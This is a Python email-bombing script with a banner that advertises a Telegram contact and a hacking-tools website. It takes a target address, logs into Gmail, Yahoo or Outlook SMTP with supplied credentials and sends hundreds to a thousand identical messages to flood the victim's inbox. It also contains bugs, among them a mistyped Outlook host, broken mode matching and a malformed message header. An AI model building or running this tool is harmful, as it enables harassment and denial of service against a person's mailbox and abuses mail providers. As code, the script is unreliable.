

import smtplib
import sys
import time
import os
from getpass import getpass
import colorama
from colorama import Fore, Style

#Time module
t = time.localtime(time.time())
localtime = time.asctime(t)
t_time= time.asctime(t)

#colour input
R = Fore.RED
B = Fore.BLUE
G = Fore.GREEN
C = Fore.CYAN
Y = Fore.YELLOW
M = Fore.MAGENTA
W = Fore.WHITE

logo = f'''{M}
######################################
#           EMAIL  BOMBER            #
# contact us t.me/pilot_bhaiya       #
#                                    #
# for more tools and free courses    #
# visit our website                  #
#         :- hackbet.co.in           #
#                                    #
######################################
{W}
'''
    
class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(logo)
            print(F'{R}-:Initializing Program:-\nPlease Wait.....\n')
            time.sleep(3)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(logo)
            self.target = str(input(f'{G}Enter Target Email\n>>>{W}'))
            os.system('cls' if os.name == 'nt' else 'clear')
            self.mode = str (input(f'{G}Enter Bomb Mode (1,2,3,4)\n1:(1000) \n2:(500) \n3:(250) \n4:(custom)\n>>>{W}'))
            os.system('cls' if os.name == 'nt' else 'clear')
            print(logo)
            if int(self.mode) > int(4) or int(self.mode ) < int(1):
                print(f'{R}ERROR: Invalid Option.{W}')
                time.sleep(2)
                sys.exit(1)
                os.system('cls' if os.name == 'nt' else 'clear')
                print(logo)
        except Exception as e :
            print(f'{R}ERROR: {W}{e}')

    def bomb(self):
        try:
            print(f'{R}Settint Up Bomb....{W}')
            time.sleep(4)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(logo)
            self.ammount = None
            if self.mode == int(1):
                self.ammoutnt = int(1000)
            elif self.mode == int(2):
                self.ammount = int(500)
            elif self.mode == int(3):
                self.ammount = int(250)
            else:
                self.ammount = int(input(f'{G}Enter A Ammount\n>>>{W}'))
                os.system('cls' if os.name == 'nt' else 'clear')
                print(logo)
            print(f'{R}you have selected bomb mode\n-{self.mode} \nand ammout-{self.ammount}')
            os.system('cls' if os.name == 'nt' else 'clear')
            print(logo)

        except Exception as e:
            print(f'{R}ERROR: {W}{e}')

    def email(self):
        try:
            print(f'{R}settint up email...{W}')
            time.sleep(3)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(logo)
            self.server = str(input(f'{G}enter email server or select premade options:-\n1:gmail \n2:yahoo \n3:outlook\n>>>{W}'))
            os.system('cls' if os.name == 'nt' else 'clear')
            print(logo)
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port =int(input(f"{G}enter port number\n>>>{W}"))

            if default_port == True:
                self.port = int(587)
            
            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp-mail.yahoo.com'
            elif self.server == '3':
                self.server = 'samtp-mail.outlook.com'

            self.fromAddr = str(input(f'{G}Enter from address\n>>>{W}'))
            self.frompwd = str(input(f'{G}Enter From Password\n>>>{W}'))
            self.subject = str(input(f'{G}Enter Subject\n>>>{W}'))
            self.message = str(input(f'{G}Enter Message\n>>>{W}'))

            self.msg = '''From %s\nTo: %s/nSubject %s\n%s\n''' %(self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.frompwd)
        except Exception as e:
            print(f'{R}ERROR: {W}{e}')
        
    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(f'{R}BOMB: {self.count}{W}')
        except Exception as e:
            print(f'{R}ERROR: {W}{e}')

    def attack(self):
        print(f'{R}ATTCAKING..........{W}')
        for email in range(self.ammount+1):
            self.send()
        self.s.close()
        print(f'{R}--Attack finished--{W}')
        sys.exit(0)

if __name__=='__main__':
    os.system('cls' if os.name == 'nt' else 'clear')
    print(logo)
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()